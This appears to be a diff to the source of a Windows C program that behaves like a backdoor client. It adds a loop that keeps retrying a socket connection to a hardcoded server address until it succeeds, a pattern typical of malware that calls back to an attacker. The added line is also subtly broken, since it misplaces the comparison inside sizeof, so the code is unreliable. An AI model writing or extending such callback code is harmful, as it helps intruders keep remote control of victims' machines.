@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <winsock.h>
+#include <winsock2.h>
 #include <windows.h>
 #include <winuser.h>
 #include <wininet.h>
@@ -37,4 +37,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServAddr.sin_family = AF_INET;
 	ServAddr.sin_addr.s_addr = inet_addr(ServIp);
 	ServAddr.sin_port = htons(ServPort);
+	
+start:
+	while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr != 0))) {
+		Sleep(10);
+		goto start;
+	}
 }
